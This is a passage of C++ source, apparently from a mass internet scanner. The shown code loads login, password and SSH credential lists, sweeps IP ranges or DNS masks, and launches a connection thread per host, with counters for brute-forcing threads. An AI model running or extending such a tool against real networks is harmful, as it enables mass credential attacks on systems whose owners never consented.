	};
}

void runAuxiliaryThreads() {
	std::thread saverThread(_saver);
	std::thread trackerThread(_tracker);
	std::thread timerThread(_timer);
	saverThread.detach();
	trackerThread.detach();
	timerThread.detach();
}

int startScan(char* args) {
	curl_global_init(CURL_GLOBAL_ALL);

	horLineFlag = false;
	flCounter = 0;
	PieAnomC1 = 0, PieWF = 0, PieBA = 0, PieSusp = 0, PieLowl = 0, PieSSH = 0;
	AnomC1 = 0, BA = 0, Filt = 0, Overl = 0, Lowl = 0, Alive = 0, Activity = 0, saved = 0, Susp = 0, WF = 0, offlines = 0;
	BrutingThrds = 0;
	found = 0;
	gTargets = 0;
	targets = 0;
	cons = 0;
	overallPorts = 0;
	found = 0;
	indexIP = 0;

	ZeroMemory(octet, sizeof(octet));
	ZeroMemory(ipsstart, sizeof(ipsstart));
	ZeroMemory(ipsend, sizeof(ipsend));
	
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	CreateDirectoryA(RESULT_DIR_NAME, NULL);
#else
	struct stat str = {0};
	if (stat(RESULT_DIR_NAME, &str) == -1) {
		mkdir(RESULT_DIR_NAME, 0700);
	}
#endif

	int argc = 0;
	char *argv[512] = { 0 };

	char *tStr = strtok(args, "|");
	while (tStr != NULL)
	{
		argv[argc++] = tStr;
		tStr = strtok(NULL, "|");
	};

	ParseArgs(argc, argv);
	mode = gMode;
	int resInit = fInit(gMode, gRange);

	if (resInit == -1)
	{
		stt->doEmitionRedFoundData("[Error] fInit failure");
		stt->doEmitionKillSttThread();

		return -1;
	};

	stt->doEmitionIPRANGE(QString("--"));
	stt->doEmitionThreads(QString::number(0) + "/" + QString::number(gThreads));

	_passLoginLoader();
	_NegativeLoader();

    runAuxiliaryThreads();

	if (gMode == 0)
    {
		unsigned long ip1 = (ipsstart[0] * 16777216) + (ipsstart[1] * 65536) + (ipsstart[2] * 256) + ipsstart[3];
		unsigned long ip2 = (ipsend[0] * 16777216) + (ipsend[1] * 65536) + (ipsend[2] * 256) + ipsend[3];

		switch (gShuffle) {
		case true: {
					   std::vector<std::string> ipVec;
					   struct in_addr tAddr;

					   for (unsigned long i = ip1; i <= ip2; ++i) {

                           if (!globalScanFlag) break;
						   unsigned long offset = ip2 - i;

						   tAddr.s_addr = ntohl(i);
						   ipVec.push_back(inet_ntoa(tAddr));
						   if (ipVec.size() != 0) strcpy(currentIP, ipVec[0].c_str());

						   if (ipVec.size() >= (offset < 1000 ? offset : 1000)) {

							   std::random_shuffle(ipVec.begin(), ipVec.end());
							   while (ipVec.size() != 0) {

								   while (cons >= gThreads && globalScanFlag) Sleep(500);
                                   if (!globalScanFlag) goto haters_gonna_hate_IPM;

								   ++indexIP;
								   std::string res = ipVec[0];
								   ipVec.erase(ipVec.begin());

								   verboseProgress(gTargets--, res.c_str());

								   Threader::fireThread(res, (void*(*)(void))_connect);
							   }
						   }
					   }

				   haters_gonna_hate_IPM:;
					   break;
		}
		case false: {
						struct in_addr tAddr;
						for (unsigned long i = ip1; i <= ip2; ++i) {

							while (cons >= gThreads && globalScanFlag) Sleep(500);
                            if (!globalScanFlag) break;

							std::string res = "";
							++indexIP;

							tAddr.s_addr = ntohl(i);
							res = string(inet_ntoa(tAddr));
							verboseProgress(gTargets--, res.c_str());

							Threader::fireThread(res, (void*(*)(void))_connect);
						}
						break;
		}
		}
	}
	else if (gMode == 1)
    {
		strcpy(top_level_domain, gFirstDom);

		char dataEntry[1024] = { 0 };
		int innerCounter = 0;
		int sz = strlen(saveEndIP);

		for (int i = 0; i < sz; ++i)
		{
			if (saveEndIP[i] == '\\')
			{
				if (saveEndIP[i + 1] == 'd')
				{
					strcat(dataEntry, "[09]");
					++i;
					innerCounter += 4;
					continue;
				}
				else if (saveEndIP[i + 1] == 'w')
				{
					strcat(dataEntry, "[0z]");
					++i;
					innerCounter += 4;
					continue;
				}
				else if (saveEndIP[i + 1] == 'l')
				{
					strcat(dataEntry, "[az]");
					++i;
					innerCounter += 4;
					continue;
				}
				else
				{
					QString errStr = "Error at mask (Position:" + QString::number(i + 1);
					errStr += ") \"";
					errStr += QString(saveEndIP).mid(0, i == 0 ? 0 : i);
					errStr += "<u>";
					errStr += QString(saveEndIP).mid(i, i == 0 ? i + 2 : i + 1);
					errStr += "</u>";
					errStr += QString(saveEndIP).mid(i + 2, strlen(saveEndIP));
					errStr += "\"";

					stt->doEmitionRedFoundData(errStr);
					return -1;
				};
			}
			else
			{
				memset(dataEntry + innerCounter++, saveEndIP[i], 1);
			};
		};

		memset(dataEntry + innerCounter + 1, '\0', 1);

		for (int i = 0; i < sz; ++i)
		{
			if (dataEntry[i] == '[')
			{
				for (int j = i + 1; j < i + 3; ++j)
				{
					if ((dataEntry[j] < '0' || dataEntry[j] > '9')
						&& (dataEntry[j] < 'a' || dataEntry[j] > 'z')
						&& dataEntry[j] != '_'
						&& dataEntry[j] != '-'
						)
					{
						QString errStr = "Error at mask (" + QString::number(j - 1);
						errStr += ") \"";
						errStr += QString(dataEntry).mid(0, j - 1);
						errStr += "<u>";
						errStr += QString(dataEntry).mid(j - 1, j + 1);
						errStr += "</u>";
						errStr += QString(dataEntry).mid(j + 1, strlen(dataEntry));
						errStr += "\"";

						stt->doEmitionRedFoundData(errStr);
						return -1;
					};
				};
				i += 3;
			}
			else if (dataEntry[i] == ']')
			{
				QString errStr = "Error at mask (" + QString::number(i - 1);
				errStr += ") \"";
				errStr += QString(dataEntry).mid(0, i - 1);
				errStr += "<u>";
				errStr += QString(dataEntry).mid(i - 1, i + 1);
				errStr += "</u>";
				errStr += QString(dataEntry).mid(i + 1, strlen(dataEntry));
				errStr += "\"";

				stt->doEmitionRedFoundData(errStr);
				return -1;
			};
		};

		unsigned long long dnsCounter = 1;
		char *dnsPtr1 = strstr(dataEntry, "[");
		while (dnsPtr1 != NULL)
		{
			dnsCounter *= _getChunkCount(dnsPtr1);
			dnsPtr1 = strstr(dnsPtr1 + 1, "[");
		};

		gTargets = dnsCounter;
		gTargetsOverall = gTargets;
		stt->doEmitionYellowFoundData("Starting DNS-scan...");
		stt->doEmitionChangeStatus("Scanning...");

		int y = _GetDNSFromMask(dataEntry, "", dataEntry);
		if (y == -1)
		{
			stt->doEmitionRedFoundData("DNS-Mode error");
		};
	}
	else if (gMode == -1)
	{
		if (flCounter == 0)
		{
			stt->doEmitionRedFoundData("Empty IP list.");
			globalScanFlag = false;
			stt->doEmitionKillSttThread();

			return -1;
		};

		stt->doEmitionChangeStatus("Scanning...");
		for (gC = 0; gC < flCounter; ++gC)
		{
			strcpy(metaRange, std::to_string(ipsstartfl[gC][0]).c_str());
			strcat(metaRange, ".");
			strcat(metaRange, std::to_string(ipsstartfl[gC][1]).c_str());
			strcat(metaRange, ".");
			strcat(metaRange, std::to_string(ipsstartfl[gC][2]).c_str());
			strcat(metaRange, ".");
			strcat(metaRange, std::to_string(ipsstartfl[gC][3]).c_str());
			strcat(metaRange, "-");
			strcat(metaRange, std::to_string(ipsendfl[gC][0]).c_str());
			strcat(metaRange, ".");
			strcat(metaRange, std::to_string(ipsendfl[gC][1]).c_str());
			strcat(metaRange, ".");
			strcat(metaRange, std::to_string(ipsendfl[gC][2]).c_str());
			strcat(metaRange, ".");
			strcat(metaRange, std::to_string(ipsendfl[gC][3]).c_str());

			unsigned long ip1 = (ipsstartfl[gC][0] * 16777216) + (ipsstartfl[gC][1] * 65536) + (ipsstartfl[gC][2] * 256) + ipsstartfl[gC][3];
			unsigned long ip2 = (ipsendfl[gC][0] * 16777216) + (ipsendfl[gC][1] * 65536) + (ipsendfl[gC][2] * 256) + ipsendfl[gC][3];

			switch (gShuffle) {
			case true: {
						   std::vector<std::string> ipVec;
						   struct in_addr tAddr;

						   for (unsigned long i = ip1; i <= ip2; ++i) {

                               if (!globalScanFlag) break;
							   unsigned long offset = ip2 - i;

							   tAddr.s_addr = ntohl(i);
							   ipVec.push_back(inet_ntoa(tAddr));
							   if (ipVec.size() != 0) strcpy(currentIP, ipVec[0].c_str());

							   if (ipVec.size() >= (offset < 1000 ? offset : 1000)) {

								   std::random_shuffle(ipVec.begin(), ipVec.end());
								   while (ipVec.size() != 0) {

									   while (cons >= gThreads && globalScanFlag) Sleep(500);
                                       if (!globalScanFlag) goto haters_gonna_hate_IM;

									   ++indexIP;
									   std::string res = ipVec[0];
									   ipVec.erase(ipVec.begin());

									   verboseProgress(gTargets--, res.c_str());

									   Threader::fireThread(res, (void*(*)(void))_connect);
								   }
							   }
						   }
					   haters_gonna_hate_IM:;
						   break;
			}
			case false: {
							struct in_addr tAddr;
							for (unsigned long i = ip1; i <= ip2; ++i) {

								while (cons >= gThreads && globalScanFlag) Sleep(500);
                                if (!globalScanFlag) break;

								++indexIP;

								tAddr.s_addr = ntohl(i);
								std::string res = string(inet_ntoa(tAddr));
								verboseProgress(gTargets--, res.c_str());
								Threader::fireThread(res, (void*(*)(void))_connect);
							}
							break;
			};
			}
		}
	}
	else
	{
		stt->doEmitionRedFoundData("Wrong parameters.");
	};

	Sleep(gTimeOut + 1);
	
	stt->doEmitionYellowFoundData("Stopping threads...");
	stt->doEmitionChangeStatus("Stopping...");
	
    while(cons > 0 || jsonArr->size() > 0) {
        Sleep(2000);
    };
	
	stt->doEmitionGreenFoundData("Done. Saved: " + QString::number(saved) + "; Alive: " + QString::number(found) + ".");
	stt->doEmitionChangeParsed(QString::number(saved) + "/" + QString::number(found));
	stt->doEmitionChangeStatus("Idle");
    stt->doEmitionKillSttThread();
}

void nCleanup(){
    Threader::cleanUp();
    curl_global_cleanup();

	if(loginLst != NULL)
	{
		for(int i = 0; i < MaxLogin; ++i) delete []loginLst[i];
		delete []loginLst;
		loginLst = NULL;
	};
	if(passLst != NULL)
	{
		for(int i = 0; i < MaxPass; ++i) delete []passLst[i];
		delete []passLst;
		passLst = NULL;
	};
	if(GlobalNegatives != NULL)
    {
        for(int i = 0; i < GlobalNegativeSize; ++i) delete []GlobalNegatives[i];
		delete []GlobalNegatives;
		GlobalNegatives = NULL;
	};
	if(wfPassLst != NULL)
	{
		for(int i = 0; i < MaxWFPass; ++i) delete []wfPassLst[i];
		delete []wfPassLst;
		wfPassLst = NULL;
	};
	if(wfLoginLst != NULL)
	{
		for(int i = 0; i < MaxWFLogin; ++i) delete []wfLoginLst[i];
		delete []wfLoginLst;
		wfLoginLst = NULL;
	};
	if(sshlpLst != NULL)
	{
		for(int i = 0; i < MaxSSHPass; ++i) delete []sshlpLst[i];
		delete []sshlpLst;
		sshlpLst = NULL;
	};
	if(ipsstartfl != NULL)
	{
		for(int i = 0; i < flCounter; ++i) delete []ipsstartfl[i];
		delete []ipsstartfl;
		ipsstartfl = NULL;
	};
	if(ipsendfl != NULL)
	{
		for(int i = 0; i < flCounter; ++i) delete []ipsendfl[i];
		delete []ipsendfl;
		ipsendfl = NULL;
	};
	if(starterIP != NULL)
	{
		for(int i = 0; i < flCounter; ++i) delete []starterIP[i];
		delete []starterIP;
		starterIP = NULL;
	};
}
